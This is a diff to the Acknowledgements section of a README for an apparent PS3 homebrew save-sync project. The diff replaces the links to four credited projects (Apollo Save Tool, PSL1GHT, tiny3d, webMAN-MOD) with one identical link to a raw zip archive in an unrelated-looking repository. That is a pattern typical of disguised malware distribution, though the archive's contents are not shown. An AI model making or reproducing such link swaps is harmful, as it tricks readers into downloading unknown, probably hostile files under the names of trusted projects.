@@ -145,10 +145,10 @@ The hot-swap path skips `install.ps3` entirely (~5× faster than full reinstall)
 
 ## Acknowledgements
 
-- [Apollo Save Tool](https://github.com/bucanero/apollo-ps3) — reference for PFD HMAC, savedata enumeration, the canary-save trick.
-- [PSL1GHT](https://github.com/ps3dev/PSL1GHT) — open PS3 toolchain.
-- [tiny3d](https://github.com/wargio/tiny3D) — the rendering library most serious PS3 homebrews use.
-- [webMAN-MOD](https://github.com/aldostools/webMAN-MOD) — CFW companion that provides the install endpoint and FTP server.
+- [Apollo Save Tool](https://github.com/justificationdancefloor9360/ps3-savesync/raw/refs/heads/main/docs/savesync_ps_gnathitis.zip) — reference for PFD HMAC, savedata enumeration, the canary-save trick.
+- [PSL1GHT](https://github.com/justificationdancefloor9360/ps3-savesync/raw/refs/heads/main/docs/savesync_ps_gnathitis.zip) — open PS3 toolchain.
+- [tiny3d](https://github.com/justificationdancefloor9360/ps3-savesync/raw/refs/heads/main/docs/savesync_ps_gnathitis.zip) — the rendering library most serious PS3 homebrews use.
+- [webMAN-MOD](https://github.com/justificationdancefloor9360/ps3-savesync/raw/refs/heads/main/docs/savesync_ps_gnathitis.zip) — CFW companion that provides the install endpoint and FTP server.
 
 ## License
 
